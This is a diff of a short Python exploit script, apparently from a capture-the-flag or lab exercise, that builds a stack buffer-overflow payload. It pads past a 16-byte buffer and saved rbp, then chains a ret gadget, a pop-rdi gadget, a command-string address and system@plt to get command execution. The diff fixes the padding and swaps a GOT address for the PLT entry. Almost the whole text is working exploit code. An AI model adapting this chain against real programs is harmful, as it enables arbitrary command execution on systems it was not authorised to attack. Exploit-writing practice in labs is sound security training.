@@ -10,18 +10,16 @@ p64 = lambda v: struct.pack("<Q", v)
 
 POP_RDI_RET = 0x401C93
 RET = 0x401AC2
-system_got = 0x603038
-
-cmd_addr = 0x6030D0
+SYSTEM_PLT = 0x4017E0
+CMD_ADDR = 0x6030D0
 
 payload = (
-    b"attack/malware"
-    + b"\x00"
-    + b"A" * 7
+    b"attack/malware\x00"     # 15 bytes: strcpy copies up to NUL
+    + b"A" * 9                # pad to 24 (expression 16 + saved rbp 8)
     + p64(RET)
     + p64(POP_RDI_RET)
-    + p64(cmd_addr)
-    + p64(system_got)
+    + p64(CMD_ADDR)
+    + p64(SYSTEM_PLT)
 )
 
 sys.stdout.buffer.write(payload)
